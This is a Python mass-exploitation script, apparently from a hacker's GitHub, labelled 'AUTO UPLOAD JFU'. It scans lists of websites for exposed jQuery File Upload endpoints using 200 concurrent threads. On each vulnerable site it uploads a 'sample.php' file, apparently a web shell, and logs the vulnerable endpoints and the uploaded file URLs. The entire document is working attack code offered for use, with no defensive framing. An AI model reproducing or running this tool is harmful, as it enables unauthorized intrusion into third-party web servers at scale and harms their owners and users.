import requests
import sys
import re
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from termcolor import colored

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

print("==============================================")
print(colored("   AUTO UPLOAD JFU (By Haxor1337x)        ",'green'))
print(colored(">> https://github.com/haxor1337x/ <<      ",'green'))
print("==============================================")

path_file = input("Give List Your Path: ")
with open(path_file, "r") as f:
    paths = f.readlines()

listpath = input("Give List Your List: ")
op = ["http://" + i.strip() for i in open(listpath, "r").readlines()]

def check(site):
    for path in paths:
        try:
            r = requests.get(site + path.strip(), verify=False, timeout=10)
            if '{"files":[{"name":"' in r.text:
                print(colored(f"{site}{path.strip()} -> Vuln", 'green'))
                with open("vuln.txt", "a+") as ff:
                    ff.write(f"{site}{path.strip()}\n")
                files = {"files[]": ("sample.php", open("sample.php", "rb"), "application/octet-stream")}
                r = requests.post(site + path.strip(), files=files, verify=False, timeout=10)
                if r.status_code == 200:
                    print(colored(f"{site}{path.strip()} -> File uploaded", 'green'))
                    match = re.search(r'"url":"(.*?)"', r.text)
                    if match:
                        uploaded_url = match.group(1).replace('\\', '')
                        print(colored(f"Uploaded URL: {uploaded_url}", 'green'))
                        with open("uploaded.txt", "a+") as uf:
                            uf.write(f"{uploaded_url}\n")
                else:
                    print(colored(f"{site}{path.strip()} -> Upload failed", 'red'))
            else:
                print(colored(f"{site}{path.strip()} -> Not Vuln", 'red'))
        except Exception as e:
            print(colored(f"{site}{path.strip()} -> Unknown Error", 'yellow'))

with Pool(200) as tod:
    tod.map(check, op)
